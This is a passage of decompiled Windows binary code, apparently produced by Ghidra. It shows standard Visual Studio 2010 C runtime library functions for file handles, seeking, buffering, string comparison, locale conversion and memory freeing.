             ((&DAT_00423840)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_00423840)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_00423840)[iVar5] = puVar4;
          DAT_00423834 = DAT_00423834 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_00423840)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_00423840)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_00423840)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_00413e8f();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_00423840)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_00413f4d();
  }
  return local_20;
}



void FUN_00413e8f(void)

{
  FUN_004127a9(10);
  return;
}



void FUN_00413f4d(void)

{
  FUN_004127a9(0xb);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2010 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_00423840)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_00423840)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_0041400f;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_0041400f:
        FUN_00414027();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_0040c664();
  }
  return -1;
}



void FUN_00414027(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2010 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_00422224 = _DAT_00422224 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_004140a9:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_004140a9;
      }
    }
    pbVar1 = (byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00423840)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_004141dd();
        goto LAB_004141d7;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_0040c664();
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_004141d7:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_004141dd(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

undefined (*) [16] __fastcall __VEC_memzero(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  
  pauVar2 = param_1;
  if (((uint)param_1 & 0xf) != 0) {
    uVar3 = 0x10 - ((uint)param_1 & 0xf);
    param_2 = param_2 - uVar3;
    for (uVar1 = uVar3 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
      (*pauVar2)[0] = 0;
      pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
    }
    for (uVar3 = uVar3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined4 *)*pauVar2 = 0;
      pauVar2 = (undefined (*) [16])(*pauVar2 + 4);
    }
  }
  for (uVar1 = param_2 >> 7; uVar1 != 0; uVar1 = uVar1 - 1) {
    *pauVar2 = (undefined  [16])0x0;
    pauVar2[1] = (undefined  [16])0x0;
    pauVar2[2] = (undefined  [16])0x0;
    pauVar2[3] = (undefined  [16])0x0;
    pauVar2[4] = (undefined  [16])0x0;
    pauVar2[5] = (undefined  [16])0x0;
    pauVar2[6] = (undefined  [16])0x0;
    pauVar2[7] = (undefined  [16])0x0;
    pauVar2 = pauVar2 + 8;
  }
  if ((param_2 & 0x7f) != 0) {
    for (uVar1 = (param_2 & 0x7f) >> 4; uVar1 != 0; uVar1 = uVar1 - 1) {
      *pauVar2 = (undefined  [16])0x0;
      pauVar2 = pauVar2 + 1;
    }
    if ((param_2 & 0xf) != 0) {
      for (uVar1 = (param_2 & 0xf) >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {
        *(undefined4 *)*pauVar2 = 0;
        pauVar2 = (undefined (*) [16])(*pauVar2 + 4);
      }
      for (uVar1 = param_2 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
        (*pauVar2)[0] = 0;
        pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
      }
    }
  }
  return param_1;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2010 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00423834)) {
      return (int)*(char *)((&DAT_00423840)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
             0x40;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_0040c664();
  }
  return 0;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_00420f04 == (HANDLE)0xfffffffe) {
    ___initconout();
  }
  if (DAT_00420f04 != (HANDLE)0xffffffff) {
    BVar1 = WriteConsoleW(DAT_00420f04,&_WCh,1,&local_8,(LPVOID)0x0);
    if (BVar1 != 0) {
      return _WCh;
    }
  }
  return 0xffff;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_00414387;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_00414387:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2010 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2010 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2010 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_00420450;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00423840)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00420450;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00423840)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
          puVar5 = &DAT_00420450;
        }
        else {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00423840)[iVar3 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = __flsbuf((int)local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_00414663;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_00414663:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2010 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_004225e4 == (DAT_00420044 | 1));
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_004225ec;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_004225e8;
    do {
      piVar2 = piVar1;
      if (DAT_004225ec == (int *)0x0) goto LAB_004146cc;
      piVar1 = DAT_004225ec;
    } while (*DAT_004225ec != *(int *)(param_1 + 4));
    piVar2[1] = DAT_004225ec[1];
    _free(_Memory);
LAB_004146cc:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_004146ef();
  return;
}



void FUN_004146ef(void)

{
  FUN_004127a9(0xe);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_00414744;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_00414710;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_00414744;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_00414744;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_00414710:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_00414744:
  return (uint)bVar5 * -2 + 1;
}



// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2010 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  SIZE_T SVar2;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return 0xffffffff;
  }
  SVar2 = HeapSize(DAT_00422218,0,_Memory);
  return SVar2;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint _Size;
  bool bVar1;
  uint uVar2;
  char *pcVar3;
  int iVar4;
  uint cchWideChar;
  uint uVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *local_10;
  
  uVar2 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  pcVar3 = param_4;
  iVar7 = param_5;
  if (0 < param_5) {
    do {
      iVar7 = iVar7 + -1;
      if (*pcVar3 == '\0') goto LAB_004147eb;
      pcVar3 = pcVar3 + 1;
    } while (iVar7 != 0);
    iVar7 = -1;
LAB_004147eb:
    iVar7 = param_5 - iVar7;
    iVar4 = iVar7 + -1;
    bVar1 = iVar4 < param_5;
    param_5 = iVar4;
    if (bVar1) {
      param_5 = iVar7;
    }
  }
  if (param_8 == 0) {
    param_8 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_8,(uint)(param_9 != 0) * 8 + 1,param_4,param_5,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_00414990;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar5 = cchWideChar * 2 + 8;
    if (uVar5 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffe0;
      local_10 = (undefined4 *)&stack0xffffffe0;
      if (&stack0x00000000 != (undefined *)0x20) {
LAB_0041487b:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar5);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_0041487b;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_00414990;
  iVar7 = MultiByteToWideChar(param_8,1,param_4,param_5,(LPWSTR)local_10,cchWideChar);
  if ((iVar7 != 0) &&
     (uVar5 = LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0), uVar5 != 0)
     ) {
    if ((param_3 & 0x400) == 0) {
      if (((int)uVar5 < 1) || (0xffffffe0 / uVar5 < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        _Size = uVar5 * 2 + 8;
        if (_Size < 0x401) {
          if (&stack0x00000000 == (undefined *)0x20) goto LAB_00414984;
          puVar6 = (undefined4 *)&stack0xffffffe8;
        }
        else {
          puVar6 = (undefined4 *)_malloc(_Size);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar7 = LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,uVar5);
        if (iVar7 != 0) {
          if (param_7 == 0) {
            param_7 = 0;
            param_6 = (LPSTR)0x0;
          }
          WideCharToMultiByte(param_8,0,(LPCWSTR)puVar6,uVar5,param_6,param_7,(LPCSTR)0x0,
                              (LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_7 != 0) && ((int)uVar5 <= param_7)) {
      LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_6,param_7);
    }
  }
LAB_00414984:
  __freea(local_10);
LAB_00414990:
  iVar7 = ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2010 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    (&local_14,(ulong)_LocaleName,_DwMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest,
                     _Code_page,_BError);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  uint uVar1;
  uint cchWideChar;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *lpWideCharStr;
  
  uVar1 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  if (param_6 == 0) {
    param_6 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_00414abd;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar2 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_00414a77:
        lpWideCharStr = puVar2 + 2;
      }
    }
    else {
      puVar2 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar2;
      if (puVar2 != (undefined4 *)0x0) {
        *puVar2 = 0xdddd;
        goto LAB_00414a77;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar3 = MultiByteToWideChar(param_6,1,param_3,param_4,(LPWSTR)lpWideCharStr,cchWideChar);
    if (iVar3 != 0) {
      GetStringTypeW(param_2,(LPCWSTR)lpWideCharStr,iVar3,param_5);
    }
    __freea(lpWideCharStr);
  }
LAB_00414abd:
  iVar3 = ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  pthreadlocinfo in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)&stack0xffffffec,_DWInfoType,_LpSrcStr,_CchSrc,_LpCharType
                     ,_Code_page,in_stack_00000020,(int)in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
